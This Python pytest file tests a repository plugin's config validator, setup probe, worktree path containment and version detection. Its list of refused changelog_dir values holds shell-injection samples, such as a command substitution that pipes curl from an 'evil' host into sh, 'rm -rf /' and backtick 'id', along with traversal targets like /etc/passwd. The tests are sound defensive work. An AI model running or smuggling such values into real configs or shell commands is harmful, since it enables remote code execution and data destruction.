"""The config layer: schema validation, the setup probe, and path containment.

Every repo-shaped fact the maintainer loop used to hardcode now lives in .oss.json.
That moves the risk rather than removing it: a probe that invents a label is worse
than one that finds none, because an invented label reads as a measurement.
"""

import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import oss_config  # noqa: E402
import skip_symlink  # noqa: E402


# --------------------------------------------------------------------------- schema


def _valid():
    return {
        "repo": "owner/name",
        "default_branch": "main",
        "clone": "~/src/name",
        "worktree_root": "~/src/name-wt",
        "branch_pattern": "fix/{issue}",
        "test_command": "pytest",
        "version_sites": [".claude-plugin/plugin.json"],
        "changelog_dir": "changelog.d",
        "docs_targets": ["README.md"],
        "labels": {"priority": [], "lanes": []},
        "state_file": ".max/oss-watch.json",
    }


def test_a_complete_config_validates():
    assert oss_config.validate(_valid()) == []


# `changelog_dir` is the one configured value that becomes shell source in a file this
# plugin writes into somebody else's repository: the generated workflow substitutes it
# into a `run:` body. It was the only key `validate()` did not look at, so a value
# carrying a command substitution passed with zero problems reported (#31).

REFUSED_CHANGELOG_DIRS = [
    "news.d$(curl -s http://evil/x|sh)",
    "news.d`id`",
    "news.d; rm -rf /",
    "news.d && curl evil",
    "news.d | sh",
    "$HOME/news.d",
    "/etc/news.d",
    "../outside",
    "news.d/../..",
    "news .d",
    "news.d/",
    "",
    123,
    ["changelog.d"],
    {"dir": "changelog.d"},
]


@pytest.mark.parametrize("value", REFUSED_CHANGELOG_DIRS, ids=lambda v: repr(v)[:40])
def test_a_changelog_dir_that_is_not_a_plain_relative_path_is_refused(value):
    config = _valid()
    config["changelog_dir"] = value
    problems = oss_config.validate(config)
    assert problems, "changelog_dir={!r} validated with no problems".format(value)
    assert any("changelog_dir" in problem for problem in problems), problems


# Nested is not exotic and must keep working: `_write` creates parent directories and
# the scaffold plans `docs/changelog.d/README.md` happily. A check tight enough to
# forbid it would refuse a legitimate repo to close a hole quoting already closes.
ACCEPTED_CHANGELOG_DIRS = ["changelog.d", "news.d", "docs/changelog.d", "doc/news/fragments", None]


@pytest.mark.parametrize("value", ACCEPTED_CHANGELOG_DIRS, ids=lambda v: repr(v)[:40])
def test_an_ordinary_relative_changelog_directory_is_accepted(value):
    config = _valid()
    config["changelog_dir"] = value
    assert oss_config.validate(config) == []


def test_the_refusal_names_the_key_and_says_what_was_expected():
    config = _valid()
    config["changelog_dir"] = "news.d$(id)"
    problems = oss_config.validate(config)
    assert len(problems) == 1, problems
    assert "changelog_dir" in problems[0]
    assert "news.d$(id)" in problems[0]


@pytest.mark.parametrize("key", sorted(_valid()))
def test_every_required_key_is_required(key):
    """A missing key must be named, not defaulted. A default here is a fact about
    some other repo wearing this repo's name.
    """
    config = _valid()
    del config[key]
    problems = oss_config.validate(config)
    assert any(key in p for p in problems), "dropping {!r} produced {!r}".format(key, problems)


def test_repo_must_be_owner_slash_name():
    config = _valid()
    config["repo"] = "name"
    assert any("repo" in p for p in oss_config.validate(config))


def test_config_may_not_carry_a_secret():
    """No key in this schema holds a credential. An unknown key that looks like one
    is refused rather than ignored, because a config file is committed.
    """
    for key in ("token", "gh_token", "password", "api_key", "secret"):
        config = _valid()
        config[key] = "x"
        problems = oss_config.validate(config)
        assert any(key in p for p in problems), "{!r} was accepted".format(key)


def test_unknown_keys_are_reported_not_ignored():
    config = _valid()
    config["worktre_root"] = "~/typo"
    assert any("worktre_root" in p for p in oss_config.validate(config))


def test_an_underscore_prefixed_key_is_maintainer_prose_not_a_typo():
    """#355. `.oss.json` is JSON with no comment syntax, so the only place a
    maintainer can record *why* a value is what it is has always been a key -- and
    every key not on the known list was refused as a typo. A leading underscore is
    the declared escape: it is documented, skipped by `validate()`, and lets the
    note sit right beside the value it explains (`_milestones_note` next to
    `milestones`), which is the property that made the note useful in the first
    place.

    This is the positive control for the test above: the same config, differing
    only in the one character that marks the key as prose, must validate clean --
    otherwise the fix is "accept everything" rather than a declared slot.
    """
    config = _valid()
    config["_milestones_note"] = "kept for the release train, not because they're open"
    assert oss_config.validate(config) == []


def test_an_underscore_prefixed_credential_is_still_refused():
    """The prose escape hatch does not launder a secret. `_api_key` is refused for
    exactly the reason a bare `api_key` is -- an underscore does not make a
    committed token safe.
    """
    config = _valid()
    config["_api_key"] = "x"
    problems = oss_config.validate(config)
    assert any("_api_key" in p and "credential" in p for p in problems)


def test_an_underscore_prefixed_credential_is_still_refused_in_the_release_block():
    """#471. The reserved-prefix escape was added in three places by 10a6002 and got
    the credential-first ordering right in only one -- the top-level check above. The
    two nested loops (`_validate_release` and its `triggers` loop) ran the prefix
    skip first, so `release._api_key` and `release.triggers._api_key` validated
    clean: a real secret laundered by an underscore into a tracked, committed file.
    """
    config = _valid()
    config["release"] = {"_api_key": "x"}
    problems = oss_config.validate(config)
    assert any("_api_key" in p and "credential" in p for p in problems), problems


def test_an_underscore_prefixed_credential_is_still_refused_in_release_triggers():
    """#471, the `release.triggers` sibling of the test above."""
    config = _valid()
    config["release"] = {"triggers": {"_github_token": "x"}}
    problems = oss_config.validate(config)
    assert any("_github_token" in p and "credential" in p for p in problems), problems


def test_an_underscore_prefixed_note_still_validates_clean_in_the_release_block():
    """Positive control for the two tests above: the escape must still work for its
    actual purpose inside the nested blocks, not just at the top level. A fix that
    refuses every underscore-prefixed key in `release` and `release.triggers` would
    pass the two tests above and still be wrong.
    """
    config = _valid()
    config["release"] = {
        "_note": "hand-tuned for this repo's release cadence",
        "triggers": {"_note": "counts observed empirically, see #123"},
    }
    assert oss_config.validate(config) == []


def test_an_underscore_prefixed_key_hidden_in_the_local_file_is_flagged(tmp_path):
    """#355 follow-up. `split()`'s own docstring says an unknown key is routed to
    the project half on purpose so it never becomes "one maintainer's private
    mystery" hidden in the git-excluded local file. The reserved-prefix escape
    must not reopen that hole: a note is exactly the kind of thing worth sharing
    with every other maintainer, so one placed only in `.oss.local.json` is
    reported as misplaced -- the same treatment any other project-scoped key
    gets when it turns up there -- rather than silently merged in unseen by
    everyone else, or silently dropped.
    """
    config = _valid()
    project, local = oss_config.split(config)
    local["_milestones_note"] = "kept for the release train, not because they're open"
    project_path = tmp_path / oss_config.CONFIG_NAME
    project_path.write_text(json.dumps(project), encoding="utf-8")
    (tmp_path / oss_config.LOCAL_CONFIG_NAME).write_text(json.dumps(local), encoding="utf-8")

    reloaded, problems = oss_config.load(project_path)
    assert any("_milestones_note" in p and oss_config.LOCAL_CONFIG_NAME in p for p in problems), problems
    assert "_milestones_note" not in reloaded


def test_an_underscore_prefixed_key_is_skipped_regardless_of_its_value_shape():
    """The slot is for prose, and prose is not always a string -- a maintainer may
    reasonably want a structured note. Nothing here type-checks it, unlike the
    reserved `notes` key alternative weighed in #355 and not taken: the value is
    maintainer prose and this validator has no opinion on its shape.
    """
    config = _valid()
    config["_context"] = {"why": ["a", "list", "of", "reasons"]}
    assert oss_config.validate(config) == []


def test_the_release_block_honours_the_same_underscore_escape():
    """#355 follow-up. `_validate_release` refuses an unknown key with its own
    message, unconditionally -- the escape landed in the top-level loop and not
    here, so a note nested under `release` (arguably the block with the most
    opinionated, hand-tuned settings a maintainer would want to explain) was
    still told it was a typo.
    """
    config = _valid()
    config["release"] = {"_note": "draft until the fragment backlog clears"}
    assert oss_config.validate(config) == []


def test_the_release_triggers_block_honours_the_same_underscore_escape():
    config = _valid()
    config["release"] = {"triggers": {"_note": "tuned after #301's flaky leg"}}
    assert oss_config.validate(config) == []


def test_load_reports_a_missing_file_as_a_finding_not_a_crash():
    problems = oss_config.load(REPO_ROOT / "does-not-exist.json")[1]
    assert problems and any("not found" in p for p in problems)


def test_load_reports_malformed_json_as_a_finding(tmp_path):
    broken = tmp_path / ".oss.json"
    broken.write_text("{not json", encoding="utf-8")
    config, problems = oss_config.load(broken)
    assert config is None
    assert problems and any("parse" in p.lower() for p in problems)


def test_read_json_object_reports_undecodable_bytes_not_a_crash(tmp_path):
    """`read_text(encoding="utf-8")` raises `UnicodeDecodeError`, a `ValueError`, not an
    `OSError` -- so a config saved in another encoding (cp1252, latin-1, UTF-16) must be
    reported as a finding rather than crash the caller with a traceback. The bytes are
    written explicitly rather than relying on a platform to produce them, because this
    bites hardest on Windows and a macOS/Linux run cannot reach it naturally (#78).
    """
    bad = tmp_path / "bad.json"
    bad.write_bytes(b"\x80not-utf8")  # a lone continuation byte: invalid at any position
    document, problem = oss_config._read_json_object(bad)
    assert document is None
    assert problem is not None
    assert "decode" in problem.lower()


def test_read_json_object_distinguishes_undecodable_from_unreadable(tmp_path):
    """The reason text must say which of the two happened -- a caller may act
    differently on "the file could not be read" (path, permissions) versus "the file
    was read and could not be decoded" (encoding). This is also the positive control for
    the test above: a well-formed sibling file in the same fixture must read cleanly
    with no problem at all, so the undecodable case is known to be measuring something
    rather than passing because nothing ran.
    """
    bad = tmp_path / "bad.json"
    bad.write_bytes(b"\x80not-utf8")
    _, bad_problem = oss_config._read_json_object(bad)
    assert "could not read" not in bad_problem

    good = tmp_path / "good.json"
    good.write_text(json.dumps({"a": 1}), encoding="utf-8")
    document, good_problem = oss_config._read_json_object(good)
    assert document == {"a": 1}
    assert good_problem is None


# ---------------------------------------------------------------------------- probe


# The candidates a probe must carry evidence about. Spelled out here rather than
# imported so a missing constant fails the test that needs it, not every test.
_CANDIDATES = (
    ".claude-plugin/plugin.json",
    "package.json",
    "Cargo.toml",
    "pyproject.toml",
    "CHANGELOG.md",
    "README.md",
)
_CARRIES = {".claude-plugin/plugin.json", "package.json", "Cargo.toml", "CHANGELOG.md"}


def _evidence_for(files):
    """Every candidate present gets a state. A candidate with no state is 'could not
    answer', and the probe contract refuses it rather than reading it as a negative.
    """
    return {f: ("version" if f in _CARRIES else "none") for f in files if f in _CANDIDATES}


def _probe(**overrides):
    probe = {
        "repo": "owner/name",
        "default_branch": "main",
        "labels": ["priority-high", "priority-low", "lane-hooks", "bug"],
        "milestones": ["v0.2.0"],
        "workflow_jobs": ["pytest", "shellcheck"],
        "files": ["pyproject.toml", "README.md", "CHANGELOG.md", "changelog.d/1.fixed.md"],
        "clone": "/src/name",
        "tags": ["v0.2.0"],
        "merge_method": None,
    }
    probe.update(overrides)
    if "version_evidence" not in overrides:
        probe["version_evidence"] = _evidence_for(probe["files"])
    return probe


def test_probe_classifies_labels_by_their_real_spelling():
    config = oss_config.build(_probe())
    assert config["labels"]["priority"] == ["priority-high", "priority-low"]
    assert config["labels"]["lanes"] == ["lane-hooks"]


def test_probe_accepts_the_colon_spelling_too():
    """One repo spells it priority-high, a sibling spells it priority:high. Both are
    real; neither is the canonical one.
    """
    config = oss_config.build(_probe(labels=["priority:high", "priority:low"]))
    assert config["labels"]["priority"] == ["priority:high", "priority:low"]


def test_probe_invents_nothing_on_a_bare_repo():
    """The repo with no labels, no milestones and no CI is the real fixture. Empty
    lists are the honest answer; a default set would read as a measurement.
    """
    config = oss_config.build(
        _probe(labels=[], milestones=[], workflow_jobs=[], files=["README.md"])
    )
    assert config["labels"] == {"priority": [], "lanes": []}
    assert "ci" not in config
    assert config["changelog_dir"] is None
    assert oss_config.validate(config) == []


def test_the_changelog_directory_is_found_from_a_file_inside_it():
    """`git ls-files` prints files, never directories. A membership test for
    "changelog.d" is therefore never true against a real probe, and every repo would
    report having adopted no fragments -- the tool's absence read as the repo's.
    """
    config = oss_config.build(_probe(files=["changelog.d/12.fixed.md", "README.md"]))
    assert config["changelog_dir"] == "changelog.d"


def test_a_repo_with_no_fragments_still_reports_none():
    config = oss_config.build(_probe(files=["README.md"]))
    assert config["changelog_dir"] is None


def test_probe_does_not_claim_milestones_that_do_not_exist():
    config = oss_config.build(_probe(milestones=[]))
    assert config["milestones"] == []


def test_probe_detects_the_test_command_from_files():
    assert oss_config.build(_probe())["test_command"] == "pytest"
    bash = oss_config.build(_probe(files=["tests/run-all.sh", "README.md"]))
    assert bash["test_command"] == "bash tests/run-all.sh"


def test_a_plain_unittest_layout_is_detected():
    """Found by running the probe on a real repo: tests/test_*.py with no pyproject
    reported `null`, which is honest and still a miss -- the tests are right there.
    Marker-based detection only sees the markers somebody thought of.
    """
    config = oss_config.build(_probe(files=["tests/test_window_spread.py", "README.md"]))
    assert config["test_command"] == "python3 -m unittest discover -s tests"


def test_pyproject_wins_over_a_bare_tests_directory():
    """Both markers present is the common case, and pytest is the more specific claim."""
    config = oss_config.build(
        _probe(files=["pyproject.toml", "tests/test_thing.py", "README.md"])
    )
    assert config["test_command"] == "pytest"


def test_probe_leaves_the_test_command_unknown_rather_than_guessing():
    config = oss_config.build(_probe(files=["README.md"]))
    assert config["test_command"] is None


def test_probe_output_validates():
    assert oss_config.validate(oss_config.build(_probe())) == []


# --------------------------------------------------------------- test verification

# The interpreter running the suite, not the name `python3`: Windows ships
# `python` and no `python3`, so the hardcoded name was not a slow suite or a
# broken one but a command that does not exist -- which made the timeout and
# not-found cases both report `failed` and hid the states they exist to tell
# apart. Quoting matters too: cmd.exe does not strip single quotes.
PY = subprocess.list2cmdline([sys.executable])
PASSES = PY + " -c pass"
FAILS = PY + ' -c "raise SystemExit(3)"'
SLEEPS = PY + ' -c "import time; time.sleep(5)"' 


def test_a_working_command_verifies_ok(tmp_path):
    """Detection infers from a marker file; this measures. A command that does not run
    is a confident wrong config, and setup is where that should be caught rather than
    by the first agent told to use it.
    """
    assert oss_config.verify_test_command(PASSES, tmp_path)["state"] == "ok"


def test_a_failing_command_is_reported_not_silently_kept(tmp_path):
    result = oss_config.verify_test_command(FAILS, tmp_path)
    assert result["state"] == "failed"
    assert "3" in result["detail"]


def test_a_command_that_does_not_exist_is_its_own_state(tmp_path):
    """A missing runner and a failing suite have different remedies."""
    result = oss_config.verify_test_command("definitely-not-a-real-binary", tmp_path)
    assert result["state"] == "not-found"


def test_a_slow_command_times_out_rather_than_hanging_setup(tmp_path):
    """Setup must not sit on somebody full suite. A timeout is unverified, which is not
    the same as broken -- calling it broken sends them to debug a suite that is slow.
    """
    result = oss_config.verify_test_command(SLEEPS, tmp_path, timeout=1)
    assert result["state"] == "timeout"
    assert "unverified" in result["detail"].lower()


def test_a_null_command_is_nothing_to_verify(tmp_path):
    assert oss_config.verify_test_command(None, tmp_path)["state"] == "none"


# ------------------------------------------------------------------ path containment


@pytest.mark.parametrize(
    "target",
    [
        "/etc/passwd",
        "../escape",
        "sub/dir",
        "sub\\dir",
        "C:\\Windows",
        "C:/Windows",
        "\\\\server\\share",
        "",
        ".",
        "..",
    ],
)
def test_worktree_targets_that_are_not_a_bare_name_are_refused(target, tmp_path):
    """A worktree target is a single directory name under the root. Anything with a
    separator, a drive prefix or a traversal is refused before it is resolved --
    checking after resolution is a race the symlink wins.
    """
    with pytest.raises(oss_config.ContainmentError):
        oss_config.resolve_worktree(tmp_path, target)


def test_a_bare_name_resolves_under_the_root(tmp_path):
    resolved = oss_config.resolve_worktree(tmp_path, "1234")
    assert resolved.parent == tmp_path.resolve()
    assert resolved.name == "1234"


def test_a_symlinked_target_escaping_the_root_is_refused(tmp_path):
    root = tmp_path / "wt"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    # A directory target, so #265's Windows-junction fallback applies here too:
    # see tests/skip_symlink.py for why a plain symlink alone would leave this
    # case skipping on every unelevated Windows leg.
    skip_symlink.symlink_or_skip(
        root / "evil",
        outside,
        target_is_directory=True,
        what="'a symlinked worktree target escaping the root is refused'",
    )
    with pytest.raises(oss_config.ContainmentError):
        oss_config.resolve_worktree(root, "evil")


def test_resolve_returns_one_resolved_path_the_caller_can_reuse(tmp_path):
    """The check and the use must be the same value. Returning the resolved path,
    rather than a boolean, is what stops a caller re-deriving it from the raw name.
    """
    assert isinstance(oss_config.resolve_worktree(tmp_path, "77"), Path)


# ------------------------------------------------------------------------ round trip


def test_written_config_reloads_identically(tmp_path):
    """`build` derives one dictionary, `/oss:setup` stores it as two files, and `load`
    puts it back together. The round trip has to be exact in both directions or the
    split has quietly dropped or renamed something (#34).
    """
    config = oss_config.build(_probe())
    project, local = oss_config.split(config)
    path = tmp_path / oss_config.CONFIG_NAME
    path.write_text(json.dumps(project, indent=2) + "\n", encoding="utf-8")
    (tmp_path / oss_config.LOCAL_CONFIG_NAME).write_text(
        json.dumps(local, indent=2) + "\n", encoding="utf-8"
    )
    reloaded, problems = oss_config.load(path)
    assert problems == []
    assert reloaded == config


# -------------------------------------------------------------- the probe contract


def test_a_complete_probe_has_nothing_to_report():
    assert oss_config.probe_problems(_probe()) == []


def test_build_refuses_a_missing_key_rather_than_reading_it_as_empty():
    """`probe.get("files") or []` made a typo'd key and an empty repo identical, so a
    probe of the wrong shape produced a confident config instead of an error (#1).
    """
    probe = _probe()
    del probe["files"]
    with pytest.raises(oss_config.ProbeError) as excinfo:
        oss_config.build(probe)
    assert "files" in str(excinfo.value)


def test_the_refusal_says_where_a_correct_probe_comes_from():
    probe = _probe()
    del probe["labels"]
    with pytest.raises(oss_config.ProbeError) as excinfo:
        oss_config.build(probe)
    assert "--probe" in str(excinfo.value)


def test_build_refuses_a_key_of_the_wrong_type():
    with pytest.raises(oss_config.ProbeError) as excinfo:
        oss_config.build(_probe(files="README.md"))
    assert "files" in str(excinfo.value)


def test_build_refuses_a_candidate_it_was_told_nothing_about():
    """A candidate present in `files` with no evidence entry is 'could not answer'.
    Collapsing it into 'carries no version' is the same defect one layer down (#2).
    """
    with pytest.raises(oss_config.ProbeError) as excinfo:
        oss_config.build(_probe(files=["README.md"], version_evidence={}))
    assert "README.md" in str(excinfo.value)


def test_build_refuses_an_evidence_state_it_does_not_know():
    with pytest.raises(oss_config.ProbeError) as excinfo:
        oss_config.build(_probe(files=["README.md"], version_evidence={"README.md": "probably"}))
    assert "probably" in str(excinfo.value)


# ------------------------------------------------------------------- version sites


def test_a_candidate_that_carries_no_version_is_not_a_version_site():
    config = oss_config.build(
        _probe(
            files=[".claude-plugin/plugin.json", "README.md"],
            version_evidence={".claude-plugin/plugin.json": "version", "README.md": "none"},
        )
    )
    assert config["version_sites"] == [".claude-plugin/plugin.json"]


def test_a_readme_that_does_carry_a_version_is_still_a_version_site():
    config = oss_config.build(
        _probe(files=["README.md"], version_evidence={"README.md": "version"})
    )
    assert config["version_sites"] == ["README.md"]


def test_a_candidate_that_could_not_be_read_is_not_asserted_as_a_site():
    """Unreadable is 'could not answer'. It is not listed, and it is not silent --
    the CLI names it -- but it never becomes a claim in the config.
    """
    config = oss_config.build(
        _probe(files=["package.json"], version_evidence={"package.json": "unreadable"})
    )
    assert config["version_sites"] == []


def test_a_root_level_python_module_carrying_a_version_constant_is_a_site():
    """The exact miss #85 was filed against: a single-file CLI's version constant
    lives beside the code (`_supertool.py: VERSION = "0.43.0"`), not in a manifest,
    and the fixed manifest whitelist had nowhere to put it -- so a release from this
    config bumped four files and left the fifth, the one the release assertion
    actually checks.
    """
    config = oss_config.build(
        _probe(
            files=["pyproject.toml", "_thing.py"],
            version_evidence={"pyproject.toml": "none", "_thing.py": "version"},
        )
    )
    assert "_thing.py" in config["version_sites"]


def test_a_nested_python_module_is_not_treated_as_a_version_site():
    """Root only. A version-shaped constant three directories deep is someone's test
    fixture or a vendored copy, not the package version -- scanning the whole tree
    would trade one false negative for a false-positive machine.
    """
    config = oss_config.build(
        _probe(
            files=["pyproject.toml", "pkg/nested.py"],
            version_evidence={"pyproject.toml": "none", "pkg/nested.py": "version"},
        )
    )
    assert "pkg/nested.py" not in config["version_sites"]


def test_the_node_and_rust_manifests_are_candidates():
    """TEST_COMMANDS knew about both; version_sites did not, so a Node release was
    told to bump README.md and never told about package.json (#10).
    """
    node = oss_config.build(
        _probe(
            files=["package.json", "README.md"],
            version_evidence={"package.json": "version", "README.md": "none"},
        )
    )
    assert node["version_sites"] == ["package.json"]
    rust = oss_config.build(
        _probe(
            files=["Cargo.toml", "README.md"],
            version_evidence={"Cargo.toml": "version", "README.md": "none"},
        )
    )
    assert rust["version_sites"] == ["Cargo.toml"]


def test_inspecting_a_tree_says_which_candidates_carry_a_version(tmp_path):
    (tmp_path / ".claude-plugin").mkdir()
    (tmp_path / ".claude-plugin" / "plugin.json").write_text(
        '{"name": "oss", "version": "0.2.1"}', encoding="utf-8"
    )
    (tmp_path / "README.md").write_text("# thing\n\nno version anywhere\n", encoding="utf-8")
    (tmp_path / "package.json").write_text("{ not json at all", encoding="utf-8")
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "x"\nversion = "1.4.0"\n', encoding="utf-8"
    )
    (tmp_path / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\ntestpaths = []\n", encoding="utf-8"
    )
    evidence = oss_config.inspect_version_sites(
        tmp_path,
        [
            ".claude-plugin/plugin.json",
            "README.md",
            "package.json",
            "Cargo.toml",
            "pyproject.toml",
            "src/main.rs",
        ],
    )
    assert evidence == {
        ".claude-plugin/plugin.json": "version",
        "README.md": "none",
        # Read completely; what is wrong with it is its contents, not the read (#396).
        "package.json": "malformed",
        "Cargo.toml": "version",
        "pyproject.toml": "none",
    }


def test_a_candidate_in_the_index_and_not_on_disk_is_absent_not_unreadable(tmp_path):
    """#396. `files` comes from `git ls-files`, which reports the **index**, while
    this function reads the **working tree**. Between an uncommitted `rm` and its
    commit -- most reliably the changelog fold -- the two disagree about exactly
    those paths, and calling them `unreadable` made `/oss:setup` print *could not
    read, so not claimed as version sites* about a file that is simply not there.

    Paired in one fixture with a file that is there and will not read, which is the
    control: without it, a fix that renamed every refusal to `absent` would pass.
    The deny is measured rather than assumed -- root ignores the mode bit, some
    filesystems ignore it, and Windows' `os.chmod` toggles a read-only attribute.
    """
    denied = tmp_path / "README.md"
    denied.write_text("# thing\n\nv1.2.3\n", encoding="utf-8")

    try:
        denied.chmod(0)
        try:
            with open(str(denied), "rb"):
                pass
        except OSError:
            deny_took = True
        else:
            deny_took = False

        evidence = oss_config.inspect_version_sites(
            tmp_path, ["README.md", "package.json"]
        )

        assert evidence["package.json"] == "absent", (
            "a candidate git lists and the working tree does not hold is not a file "
            "this process failed to read -- it is a file that is not there, and the "
            "receipt says so in different words; got {!r}".format(evidence)
        )
        if deny_took:
            assert evidence["README.md"] == "unreadable", (
                "the control: a file that IS there and will not read must still fill "
                "the unreadable bucket, or absence has simply renamed every refusal; "
                "got {!r}".format(evidence)
            )
        else:
            pytest.skip(
                "mode 0 did not deny a read here, so this platform cannot produce a "
                "listed-and-unreadable candidate. UNTESTED here: whether a file that "
                "exists and will not read still reports `unreadable` rather than "
                "being folded into the `absent` bucket #396 added. The absent half "
                "above was asserted."
            )
    finally:
        denied.chmod(0o600)


def test_a_candidate_that_reads_completely_but_will_not_parse_is_malformed(tmp_path):
    """#396's design call. `unreadable` was carrying three different facts, and two
    of them are not about the read at all: a `package.json` whose every byte arrived
    and is not JSON, and one that parses into something that is not an object.

    Reporting *could not read* about a file this process read in full is the same
    defect the absent bucket fixes, one line over -- the tool's answer about its own
    read rendered as an answer about the file. So `unreadable` now means exactly
    what the word means, and the structural failures have their own name.
    """
    (tmp_path / "package.json").write_text("{ not json at all", encoding="utf-8")
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "x"\nversion = "1.4.0"\n', encoding="utf-8"
    )
    evidence = oss_config.inspect_version_sites(
        tmp_path, ["package.json", "Cargo.toml"]
    )
    assert evidence["package.json"] == "malformed", (
        "a JSON candidate that read completely and did not parse is a fact about the "
        "file, discovered by reading all of it -- not a read that failed; got "
        "{!r}".format(evidence)
    )
    assert evidence["Cargo.toml"] == "version", (
        "the control: an ordinary candidate beside it must still be measured, or "
        "`malformed` has swallowed the happy path"
    )


def test_a_json_candidate_that_parses_to_a_non_object_is_malformed(tmp_path):
    """The second of the two facts `unreadable` was carrying. A `package.json`
    holding a JSON array read completely and parsed completely; what is wrong with
    it is its shape.
    """
    (tmp_path / "package.json").write_text('["not", "an", "object"]', encoding="utf-8")
    evidence = oss_config.inspect_version_sites(tmp_path, ["package.json"])
    assert evidence["package.json"] == "malformed", (
        "got {!r}".format(evidence)
    )


def test_the_setup_receipt_says_absent_and_unreadable_in_different_words(capsys):
    """The wrong receipt #396 was filed for, asserted at the surface that prints it.

    One NOTE per state, and the absent sentence must not claim a read was attempted
    and failed. All four states are present in one probe so a receipt that collapses
    any two of them fails here rather than in somebody's terminal.
    """
    probe = {
        "labels": [],
        "version_evidence": {
            "README.md": "version",
            "CHANGELOG.md": "absent",
            "package.json": "unreadable",
            "Cargo.toml": "malformed",
        },
    }
    oss_config._report_probe_notes(probe, {})
    printed = capsys.readouterr().err

    absent_line = [line for line in printed.splitlines() if "CHANGELOG.md" in line]
    assert absent_line, "the absent candidate was not named at all: {!r}".format(printed)
    assert "could not read" not in absent_line[0], (
        "an uncommitted delete is being reported as a read that failed, which is the "
        "wrong receipt #396 was filed for: {!r}".format(absent_line[0])
    )
    assert "not on disk" in absent_line[0], absent_line[0]

    unreadable_line = [line for line in printed.splitlines() if "package.json" in line]
    assert unreadable_line, "the unreadable candidate vanished: {!r}".format(printed)
    assert "could not read" in unreadable_line[0], (
        "the control: a file that is there and will not read must keep its own "
        "sentence, or absence has renamed every refusal: {!r}".format(unreadable_line[0])
    )

    malformed_line = [line for line in printed.splitlines() if "Cargo.toml" in line]
    assert malformed_line, "the malformed candidate vanished: {!r}".format(printed)
    assert "could not read" not in malformed_line[0], (
        "a file read in full whose contents are the wrong shape is not a read that "
        "failed: {!r}".format(malformed_line[0])
    )

    assert "README.md" not in printed, (
        "a candidate that was read and carries a version has nothing to report, so "
        "naming it turns the receipt into noise: {!r}".format(printed)
    )


def test_a_root_python_module_with_a_version_constant_is_measured_not_guessed(tmp_path):
    (tmp_path / "_thing.py").write_text(
        'import sys\n\nVERSION = "0.43.0"\n\ndef main():\n    pass\n', encoding="utf-8"
    )
    (tmp_path / "dunder.py").write_text('__version__ = "1.2.3"\n', encoding="utf-8")
    (tmp_path / "neither.py").write_text('MIN_PYTHON = "3.9.0"\n', encoding="utf-8")
    evidence = oss_config.inspect_version_sites(
        tmp_path, ["_thing.py", "dunder.py", "neither.py"]
    )
    assert evidence["_thing.py"] == "version"
    assert evidence["dunder.py"] == "version"
    assert evidence["neither.py"] == "none"


def test_a_nested_python_module_is_never_inspected_at_all(tmp_path):
    """Root only, symmetrically at the measurement layer too."""
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "nested.py").write_text('VERSION = "9.9.9"\n', encoding="utf-8")
    evidence = oss_config.inspect_version_sites(tmp_path, ["pkg/nested.py"])
    assert evidence == {}


# ----------------------------------------------------------------------- the labels


def test_labels_are_classified_across_the_spellings_in_the_wild():
    """priority/high is GitHub's own documented convention and matched nothing (#10)."""
    result = oss_config.classify_labels(
        ["priority/high", "P1", "area/api", "type:chore", "lane-core", "bug"]
    )
    assert result["priority"] == ["priority/high", "P1"]
    assert result["lanes"] == ["area/api", "type:chore", "lane-core"]


def test_labels_that_matched_nothing_are_named_rather_than_dropped():
    """An empty priority list on a fully labelled board was byte-identical to one on a
    board with no priorities at all. Naming the misses is what tells them apart.
    """
    result = oss_config.classify_labels(["priority/high", "bug", "documentation"])
    assert result["unclassified"] == ["bug", "documentation"]


def test_a_repo_with_no_labels_has_nothing_unclassified():
    assert oss_config.classify_labels([]) == {"priority": [], "lanes": [], "unclassified": []}


def test_a_label_is_classified_once():
    result = oss_config.classify_labels(["priority/high"])
    assert result["lanes"] == []
    assert result["unclassified"] == []


# --------------------------------------------------------------------- gathering it

GIT = shutil.which("git")
needs_git = pytest.mark.skipif(
    GIT is None, reason="git is not on PATH, so there is no repo to probe"
)


def _git_repo(root, files):
    root.mkdir(parents=True, exist_ok=True)
    subprocess.run([GIT, "init", "-q", str(root)], check=True)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    subprocess.run([GIT, "-C", str(root), "add", "-A"], check=True)


def _fake_gh(root, args):
    if args[0] == "repo":
        return (
            True,
            {
                "nameWithOwner": "owner/name",
                "defaultBranchRef": {"name": "main"},
                "squashMergeAllowed": True,
                "mergeCommitAllowed": False,
                "rebaseMergeAllowed": False,
            },
            "",
        )
    if args[0] == "label":
        return True, [{"name": "priority/high"}, {"name": "bug"}], ""
    return True, [{"title": "v1.0"}], ""


@needs_git
def test_gathering_produces_a_probe_that_build_accepts(tmp_path, monkeypatch):
    """One implementation of the schema. The probe the command used to assemble by
    hand -- and got wrong -- now comes from the same code that consumes it (#1).
    """
    _git_repo(
        tmp_path,
        {
            "README.md": "# thing\n\nno version here\n",
            ".claude-plugin/plugin.json": '{"version": "0.2.1"}\n',
            "tests/test_thing.py": "def test_x():\n    assert True\n",
            ".github/workflows/ci.yml": (
                "name: ci\non: push\njobs:\n  unit:\n    runs-on: ubuntu-latest\n"
                "  lint:\n    runs-on: ubuntu-latest\n"
            ),
        },
    )
    monkeypatch.setattr(oss_config, "_gh_json", _fake_gh)
    probe, problems, notes = oss_config.gather(tmp_path)
    assert problems == []
    # Every workflow this fixture tracks is on disk, so there is nothing to note (#396).
    assert notes == []
    assert "tests/test_thing.py" in probe["files"]
    assert "tests" not in probe["files"]
    assert probe["version_evidence"] == {
        ".claude-plugin/plugin.json": "version",
        "README.md": "none",
    }
    assert len(probe["workflow_jobs"]) == 2
    assert oss_config.probe_problems(probe) == []

    config = oss_config.build(probe)
    assert oss_config.validate(config) == []
    assert config["version_sites"] == [".claude-plugin/plugin.json"]
    assert config["test_command"] == "python3 -m unittest discover -s tests"
    assert config["labels"]["priority"] == ["priority/high"]
    assert config["release"]["merge_method"] == "squash"


@needs_git
def test_gathering_names_the_labels_it_could_not_classify(tmp_path, monkeypatch):
    _git_repo(tmp_path, {"README.md": "# thing\n"})
